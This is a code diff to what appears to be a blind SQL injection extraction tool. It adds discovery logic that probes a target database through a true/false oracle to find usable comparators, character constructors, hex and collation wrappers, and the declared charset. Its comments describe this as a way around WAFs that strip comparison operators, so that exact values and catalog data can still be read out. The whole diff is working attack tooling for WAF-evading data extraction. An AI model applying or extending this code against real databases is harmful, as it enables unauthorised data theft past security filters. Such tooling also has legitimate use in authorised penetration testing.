@@ -12,6 +12,8 @@ from .atlas import _BYTELEN
 from .atlas import _CATALOGS
 from .atlas import _CHARCODE
 from .atlas import _CHARFROM
+from .atlas import _charsetCodec
+from .atlas import _CHARSET_PROBES
 from .atlas import _COALESCE
 from .atlas import _CONCAT
 from .atlas import _DUAL
@@ -67,6 +69,7 @@ class _Discovery(object):
         self._discoverCompare()
         self._discoverComparator()
         self._discoverCharfrom()
+        self._discoverCharset()
         self._discoverDual()
         self._discoverIdentity()
         self._discoverCatalog()
@@ -84,7 +87,13 @@ class _Discovery(object):
         self.dialect.substring = None       # route retrieval to the pattern-match path
         self.dialect.length = None
         self.dialect.compare = "like"
+        # the numeric/paging comparator is STILL needed here: catalog keyset paging relies on
+        # it, and the constructor default 'gt'/_inOk=True would silently fail (returning only
+        # the first row, no warning) on the very WAF that forced this floor. Discover the real
+        # capability so paging uses NOT IN / brute-force honestly.
+        self._discoverComparator()
         self._discoverCharfrom()
+        self._discoverCharset()
         self._discoverDual()
         self._discoverCatalog()
         self._discovered = True
@@ -212,9 +221,20 @@ class _Discovery(object):
         # of pushing a raw non-ASCII byte through the URL/app/DBMS encoding layers.
         if self._codeTmpl is None:
             self._codeTmpl = False
-            for _, tmpl in _CHARFROM:
-                if self._ask("%s='a'" % tmpl.format(code=97)) and not self._ask("%s='b'" % tmpl.format(code=97)):
+            # PASS 1 prefers a UNICODE-capable constructor (one that yields a non-NULL char for a
+            # code point > 255), so SQL Server picks NCHAR over the byte-only CHAR - CHAR(8364)
+            # is NULL there and would break the euro/UTF-16 probes. PASS 2 accepts any ASCII-
+            # working constructor when no Unicode-capable one exists.
+            for unicode_capable in (True, False):
+                for _, tmpl in _CHARFROM:
+                    if not (self._ask("%s='a'" % tmpl.format(code=97)) and
+                            not self._ask("%s='b'" % tmpl.format(code=97))):
+                        continue
+                    if unicode_capable and not self._ask("(%s) IS NOT NULL" % tmpl.format(code=256)):
+                        continue
                     self._codeTmpl = tmpl
+                    break
+                if self._codeTmpl:
                     break
         return self._codeTmpl or None
 
@@ -281,7 +301,12 @@ class _Discovery(object):
         if self.dialect.concat:
             joined = self.dialect.concat[1].format(a="({expr})", b="'.'")
             props = dict(L.props, trailing=True)
-            self.dialect.length = Cap(L.name + "+dot", "(%s)-1" % L[1].format(expr=joined), **props)
+            inner = "(%s)-1" % L[1].format(expr=joined)
+            # a variadic CONCAT() (SQL Server/Sybase) treats NULL as '' -> LEN(CONCAT(NULL,'.'))-1
+            # is 0, which would report a NULL value as an empty string. Guard so a NULL input
+            # still yields NULL (keeps is_null detectable); harmless for NULL-preserving '||'.
+            tmpl = "(CASE WHEN ({expr}) IS NULL THEN NULL ELSE %s END)" % inner
+            self.dialect.length = Cap(L.name + "+dot", tmpl, **props)
             self.dialect.notes.append("length fn trims trailing spaces; using %s(x||'.')-1" % L.name)
         else:
             self.dialect.notes.append("length fn trims trailing spaces and no concat to correct it")
@@ -290,10 +315,12 @@ class _Discovery(object):
         # substring positions and the length count must be in the SAME unit, else
         # the per-position walk desyncs on multibyte data
         s, ln = self.dialect.substring, self.dialect.length
-        if s and ln:
-            su, lu = s.get("unit"), ln.get("unit")
-            if su == "characters" and lu == "bytes":
-                self.dialect.notes.append("UNIT MISMATCH: char-indexed substring vs byte-count length - multibyte values may desync")
+        if s and ln and s.get("unit") == "characters" and ln.get("unit") == "bytes":
+            # HARD strategy change (not just a warning): a byte-count length would drive the
+            # char-indexed substring walk PAST the end of a multibyte value. Discard it so
+            # length is derived from the char-based substring instead - same unit, no desync.
+            self.dialect.notes.append("unit mismatch (char substring vs byte-count length) - deriving length from substring")
+            self.dialect.length = None
 
     def _discoverBytelen(self):
         # a *byte*-length fn - distinguished from char length with a multibyte char
@@ -312,6 +339,11 @@ class _Discovery(object):
             self.dialect.bytelen = Cap(name, tmpl)
             return name
 
+    # casts with no length bound - hex-framing a value through these can never truncate it;
+    # anything else may silently shorten a long value, so dump() verifies those cells at source
+    _UNBOUNDED_CASTS = frozenset(("cast_text", "cast_char", "cast_nvarchar_max",
+                                  "cast_varchar_max", "cast_string"))
+
     def _discoverTextcast(self):
         # a cast that stringifies a number: substr(cast(123),1,1)='1' and the
         # negative sign survives (substr(cast(-42),1,1)='-')
@@ -320,7 +352,7 @@ class _Discovery(object):
             if self._ask("%s='1'" % self._sub(c123, 1, 1)) and \
                self._lenEquals(c123, 3) and \
                self._ask("%s='-'" % self._sub(cneg, 1, 1)):
-                self.dialect.textcast = Cap(name, tmpl)
+                self.dialect.textcast = Cap(name, tmpl, bounded=name not in self._UNBOUNDED_CASTS)
                 return name
 
     def _discoverCoalesce(self):
@@ -378,23 +410,44 @@ class _Discovery(object):
         # 2) force byte-ordered comparison via COLLATE / binary cast - as fast as a
         #    code function (one compare per bisection) and recovers case under CI /
         #    locale collations. tried before hex because it's cheaper.
+        cf = self._codeCharTmpl()
         for name, tmpl in _BINWRAP:
             w = lambda s: tmpl.format(x=s)
-            if self._ask("%s>%s" % (w("'a'"), w("'A'"))) and \
-               not self._ask("%s>%s" % (w("'A'"), w("'a'"))) and \
-               not self._ask("%s=%s" % (w("'a'"), w("'A'"))):
-                self.dialect.binwrap = Cap(name, tmpl)
-                self.dialect.compare = "collation"
-                self.dialect.ordered = True
-                return "collation:%s" % name
+            if not (self._ask("%s>%s" % (w("'a'"), w("'A'"))) and
+                    not self._ask("%s>%s" % (w("'A'"), w("'a'"))) and
+                    not self._ask("%s=%s" % (w("'a'"), w("'A'")))):
+                continue
+            # BYTE-EXACT proof, not just case ORDER: a binary wrapper is used to certify EXACT
+            # values, so it must also distinguish TRAILING SPACES (most collations are PAD SPACE)
+            # and ACCENTS (many collations are accent-insensitive). One that folds either is
+            # ordered but NOT byte-exact -> skip it and fall through to hex, rather than promote a
+            # folded value (trailing-space or accent folding) to EXACT.
+            if self._ask("%s=%s" % (w("'a'"), w("'a '"))):          # trailing-space insensitive
+                continue
+            # accent test needs a char constructor to build the accented probe. If we HAVE one and
+            # it folds -> skip (not byte-exact). If we DON'T (constructors blocked), accents are
+            # UNTESTABLE: keep the wrapper for ORDERING (char reads) but mark byte_exact=False, so
+            # it does NOT certify EXACT (an accent-insensitive wrapper would silently pass an accented char as its base letter).
+            byte_exact = False
+            if cf:
+                if self._ask("%s=%s" % (w(cf.format(code=0xE9)), w("'e'"))):       # accent insensitive
+                    continue
+                byte_exact = True
+            self.dialect.binwrap = Cap(name, tmpl, byte_exact=byte_exact)
+            self.dialect.compare = "collation"
+            self.dialect.ordered = True
+            if not byte_exact:
+                self.dialect.notes.append("binary wrapper accent-sensitivity untestable (no char "
+                                          "constructor) - used for ordering, not exactness")
+            return "collation:%s" % name
 
         # 3) hex/byte function - collation-independent, recovers letter case even
         #    under case-insensitive collations (the key fallback when code fns are
         #    filtered by a WAF)
         for name, tmpl in _HEXFN:
             enc = self._hexEncoding(tmpl)
-            if enc:
-                self.dialect.hexfn = Cap(name, tmpl, encoding=enc)
+            if enc is not None:                          # '' = usable, codec unknown (auto-detect)
+                self.dialect.hexfn = Cap(name, tmpl, encoding=(enc or None))
                 self.dialect.compare = "hex"
                 self.dialect.ordered = True
                 return "hex:%s" % name
@@ -418,15 +471,35 @@ class _Discovery(object):
         self.dialect.notes.append("case-insensitive collation and no code/hex function: letter case is not recoverable")
         return "equality-ci"
 
+    # STRICT-'>' semantic truth table across the signed domain. Two positive samples (2>1,
+    # !2>3) are NOT enough: a '>'->'>=' rewrite passes them but fails the equality boundary
+    # (2>2 must be FALSE) and would then read every count/length/code off by one. Each
+    # candidate must reproduce '>' at the equality boundary AND across zero and negatives.
+    _GT_TRUTH = ((2, 1, True), (2, 2, False), (2, 3, False),
+                 (0, -1, True), (0, 0, False), (0, 1, False),
+                 (-2, -3, True), (-2, -2, False), (-2, -1, False))
+
+    def _provesGt(self, render):
+        # render(a, b) -> SQL for "a > b"; the candidate is accepted only if it matches
+        # strict '>' on EVERY truth-table row (equality boundary + zero + negative domain).
+        try:
+            for a, b, want in self._GT_TRUTH:
+                if bool(self._ask(render(a, b))) != want:
+                    return False
+        except OracleUndecided:
+            return False
+        return True
+
     def _discoverComparator(self):
         # how to express "value > threshold" for bisection. A WAF that strips '<'/'>'
         # (very common) would otherwise leave code-mode picking '>' and silently
         # failing. Prefer '>'; else BETWEEN (ordered, no angle brackets); else fall
         # to order-free IN() subset bisection which needs only '=' membership.
+        HUGE = 1 << 62
         try:
-            if self._ask("2>1") and not self._ask("2>3"):
+            if self._provesGt(lambda a, b: "%d>%d" % (a, b)):
                 self._comparator = "gt"
-            elif self._ask("2 BETWEEN 2 AND 3") and not self._ask("5 BETWEEN 2 AND 3"):
+            elif self._provesGt(lambda a, b: "%d BETWEEN %d AND %d" % (a, b + 1, HUGE)):
                 self._comparator = "between"
                 self.dialect.notes.append("'>' unusable; bisecting via BETWEEN")
             elif self._discoverOperatorFreeComparator():
@@ -442,8 +515,9 @@ class _Discovery(object):
     def _discoverOperatorFreeComparator(self):
         # Manual-derived ways to express "expr > n" using NO comparison operator (>,<,>=,<=,BETWEEN):
         # each is an ORDERED (log2) test, so efficient bisection survives a WAF that strips the
-        # comparison operators instead of dropping to slow order-free membership. Ordered universal-
-        # first; each self-selects by a 3-point probe (2>1 true, 2>3/2>2 false). {expr}/{n} filled at use.
+        # comparison operators. Each must pass the FULL signed truth table (not a 3-point positive
+        # probe), so a candidate that can't represent the negative/zero domain (e.g. WIDTH_BUCKET
+        # with lo==hi at n=-1) is rejected instead of silently misreading signed values.
         candidates = (
             ("sign",        "SIGN(({expr})-({n}))=1"),                             # SIGN(): every major DBMS
             ("abs",         "ABS(({expr})-({n})-1)=({expr})-({n})-1"),             # ABS(): backup if SIGN is name-filtered
@@ -453,7 +527,7 @@ class _Discovery(object):
             ("interval",    "INTERVAL(({expr}),({n})+1)=1"),                       # MySQL / MariaDB
         )
         for name, tmpl in candidates:
-            if self._ask(tmpl.format(expr=2, n=1)) and not self._ask(tmpl.format(expr=2, n=3)) and not self._ask(tmpl.format(expr=2, n=2)):
+            if self._provesGt(lambda a, b, _t=tmpl: _t.format(expr=a, n=b)):
                 self._comparator = name
                 self._cmpTemplate = tmpl
                 self.dialect.notes.append("'>'/BETWEEN unusable; ordered bisection via %s() (no comparison operator)" % name.upper())
@@ -490,6 +564,28 @@ class _Discovery(object):
                 self.dialect.charfrom = Cap(name, tmpl)
                 return name
         self.dialect.charfrom = None
+
+    def _discoverCharset(self):
+        # ASK THE DB ITS DECLARED CHARSET - the strongest possible encoding signal, and one a
+        # boolean oracle can read directly (a huge advantage over passive byte-guessing, which
+        # can't tell utf-8 e-acute from cp1252 mojibake). The first family probe that resolves gives a
+        # name; map it (quirk-aware: MySQL latin1==cp1252) to a Python codec used as the
+        # authoritative hex decoder. Unproven -> None -> non-ASCII text stays non-exact.
+        with self._probePhase():                    # a wrong-family charset expr errors -> skip
+            for expr in _CHARSET_PROBES:
+                try:
+                    if not self._hasChars(expr):
+                        continue
+                    res = self.extractResult(expr, limit=64)
+                except OracleUndecided:
+                    continue
+                if res.value and res.exact:
+                    codec = _charsetCodec(res.value)
+                    if codec:
+                        self.dialect.charset = codec
+                        self.dialect.notes.append("declared charset %r -> %s" % (res.value, codec))
+                        return codec
+        return None
 
     def _discoverIdentity(self):
         for kind, candidates in sorted(_IDENTITY.items()):
